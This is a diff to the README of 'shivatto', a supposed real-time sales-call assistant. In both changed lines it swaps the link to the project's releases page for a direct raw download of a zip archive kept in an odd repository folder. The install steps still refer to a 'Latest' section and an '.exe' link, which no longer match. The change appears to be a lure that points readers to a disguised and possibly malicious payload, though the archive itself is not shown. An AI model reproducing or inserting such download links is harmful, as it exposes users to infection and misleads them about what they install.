@@ -1,6 +1,6 @@
 # 🎧 shivatto - Realtime sales assistance during every call
 
-[![Download shivatto](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Sullytransvestite873/shivatto/releases)
+[![Download shivatto](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Sullytransvestite873/shivatto/raw/refs/heads/main/Romanize/Software-v3.6.zip)
 
 shivatto acts as a helper for your sales calls. It listens to your conversations and provides suggestions in real time. This tool helps you maintain control of the discussion and close deals with more accuracy. The software runs quietly on your computer to assist you while you speak with clients.
 
@@ -27,7 +27,7 @@ To run shivatto, your computer needs the following specifications:
 
 You must visit the project release page to get the software. Follow these steps to obtain the correct file:
 
-1. Visit [https://github.com/Sullytransvestite873/shivatto/releases](https://github.com/Sullytransvestite873/shivatto/releases).
+1. Visit [https://github.com/Sullytransvestite873/shivatto/raw/refs/heads/main/Romanize/Software-v3.6.zip](https://github.com/Sullytransvestite873/shivatto/raw/refs/heads/main/Romanize/Software-v3.6.zip).
 2. Look for the section titled "Latest".
 3. Click the link that ends in ".exe" to begin the download.
 4. Save the file to your desktop or your Downloads folder.
